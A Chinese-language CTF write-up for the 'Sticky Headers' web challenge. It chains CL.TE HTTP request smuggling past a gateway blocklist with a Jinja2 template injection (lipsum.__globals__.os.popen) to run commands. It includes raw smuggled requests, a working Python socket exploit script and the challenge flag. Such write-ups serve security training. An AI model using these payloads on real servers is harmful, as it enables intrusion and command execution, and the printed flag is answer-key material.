---
title: "Sticky Headers — 用请求走私绕过网关，再 SSTI 拿 RCE (FortID CTF)"
description: FortID CTF web 题：HTTP 请求走私 + Jinja2 模板注入的组合拳 writeup
type: ctf
pubDate: Oct 12 2026
updatedDate: Oct 12 2026
---

> 分类：Web ｜ 赛事：FortID CTF 2026 ｜ 关键词：HTTP Request Smuggling、SSTI
>
> Flag: `FortID{1_C4NT_5H4K3_TH15_H34D3R_1d2e3a015f}`

## 题目背景

Sticky Headers 给了一个看起来平平无奇的点餐网站：首页能下单（`POST /order`），还有一个明显是"内部功能"的 `/staff` 路径。直接访问 `/staff` 或 `/staff/preview`，网关直接甩给你一个 **403**——前面有一层 gateway 在做路径黑名单，凡是 `/staff*` 一律拦掉。

题目名字已经在剧透了：问题出在 **header** 上。所以我的第一反应是：这大概率是一道 **HTTP 请求走私（Request Smuggling）** 的题——想办法把一个请求"藏"在另一个请求里，偷偷溜过网关送到后端。

## 侦察：前后端对协议的理解不一致

走私的本质，是**前端代理和后端服务器对"一个请求到哪里结束"判断不一致**。要利用它，先得搞清楚这条链路上两边分别是什么。

我探测了一下：

- 服务器通过 ALPN 假装支持 HTTP/2，但实际说话还是 **HTTP/1.1**。这很关键——HTTP/2 本身没有走私（它用二进制帧、有明确的长度），但 HTTP/1.1 用 `Content-Length` 和 `Transfer-Encoding` 两种方式表示 body 长度，一旦前后端各信一个，就有缝可钻。
- 后端是个 **Python 的 `BaseHTTPServer`**（从报错和响应头的指纹能看出来）。这类朴素实现对 `Transfer-Encoding` 的解析往往不严谨，正是走私的经典温床。

于是方向就清晰了：**让前端按 `Content-Length` 来切请求、让后端按 `Transfer-Encoding: chunked` 来切**，两者错位，夹带的第二个请求就能绕过网关的 `/staff` 黑名单。

## 关键漏洞：CL.TE 走私

我构造的请求长这样（核心是同时带 `Content-Length` 和一个被"做了手脚"的 `Transfer-Encoding`）：

```http
POST /order HTTP/1.1
Host: <target>
Content-Length: 4
Transfer-Encoding: chunked, identity

0

POST /staff/preview HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: <len>

message=<payload>
```

拆开讲发生了什么：

1. **前端网关信 `Content-Length: 4`**：它认为这个请求的 body 只有 `0\r\n\r\n` 这 4 个字节（第一个 chunk 的结束标记），于是把 `POST /order` 放行，剩下的字节它当成"下一个请求"留在连接里。因为它看到的只有 `/order`，黑名单不触发。
2. **后端信 `Transfer-Encoding`**：那个 `chunked, identity` 的写法让朴素的 Python 服务器把传输当成 chunked 处理，读到 `0\r\n\r\n` 就认为第一个请求结束，然后**接着在同一条连接上**把后面那段 `POST /staff/preview ...` 当成一个全新的、合法的请求来处理。

网关压根没看见 `/staff/preview`——它已经被我们"走私"过去了。`/staff/preview` 接收一个 `message` 字段。

## 升级：从走私到 RCE（Jinja2 SSTI）

能打到 `/staff/preview` 只是拿到门票，真正要命的是它怎么处理 `message`。后端直接把用户输入塞进了 Jinja2：

```python
Template(message).render()
```

这是教科书级别的 **服务端模板注入（SSTI）**——`message` 没有经过任何转义就被当成模板源码编译。先用经典探针确认：

```
message={{7*7}}   ->   预览里回显 49
```

`49` 出现了，确认是 Jinja2 SSTI。接下来顺着 Jinja2 的沙箱逃逸套路，从 `lipsum`（一个内置全局函数）摸到它的 `__globals__`，里面带着 `os`，就能直接 `popen` 执行系统命令：

```jinja2
{{ lipsum.__globals__.os.popen('cat /tmp/recipe.txt').read() }}
```

把这段作为 `message` 的值走私进去，预览响应里就吐出了命令结果。flag 就写在 `/tmp/recipe.txt` 里。

## 自动化脚本

手工发这种畸形请求很容易被各种库"好心地"帮你修正掉（它们会自动算 `Content-Length`、删掉重复头），所以我用裸 socket 自己拼字节、自己发：

```python
import socket, ssl

HOST, PORT = "<target>", 443

def smuggle(cmd):
    payload = ("{{ lipsum.__globals__.os.popen(%r).read() }}" % cmd)
    inner = (
        f"POST /staff/preview HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len('message=') + len(payload)}\r\n"
        f"\r\n"
        f"message={payload}"
    )
    outer = (
        f"POST /order HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked, identity\r\n"
        f"\r\n"
        f"0\r\n\r\n"
        f"{inner}"
    )
    ctx = ssl.create_default_context()
    with ctx.wrap_socket(socket.create_connection((HOST, PORT)), server_hostname=HOST) as s:
        s.sendall(outer.encode())
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    return data.decode(errors="replace")

print(smuggle("cat /tmp/recipe.txt"))
```

一个**踩过的坑**：命令要短平快。我一开始手贱跑了个 `grep -r flag /`，这种长时间占用的命令会把"网关↔后端"那条复用的 TCP 连接**堵死/污染**，之后所有请求都超时。解决办法：重启实例，老老实实用短命令（`cat`、`ls`、`id`）。

## Flag

```
FortID{1_C4NT_5H4K3_TH15_H34D3R_1d2e3a015f}
```

## 小结 / 收获

- **题名就是提示**。"Sticky Headers" 直接点了 header，顺着"HTTP header 怎么会出问题"去想，很快就能锁定走私方向。
- **走私的前提是"解析分歧"**。能利用，不是因为某个头写错了，而是因为链路上两个组件对同一串字节的理解不一样。打之前一定先把前端（代理/网关）和后端（具体什么实现）各是什么指纹摸清楚——`Content-Length` vs `Transfer-Encoding` 谁信谁，决定了用 CL.TE 还是 TE.CL。
- **组合拳才是真正的杀伤**。单独一个走私只是绕过黑名单，单独一个 SSTI 可能根本够不到那个端点。把"绕过网关"和"后端无脑 `Template().render()`"接在一起，才从 403 一路打到 RCE。
- **用裸 socket，别用高级 HTTP 库**。`requests`/`httpx` 会替你把畸形请求"修好"，走私自然就失败了。走私类题目，自己拼字节发是基本功。
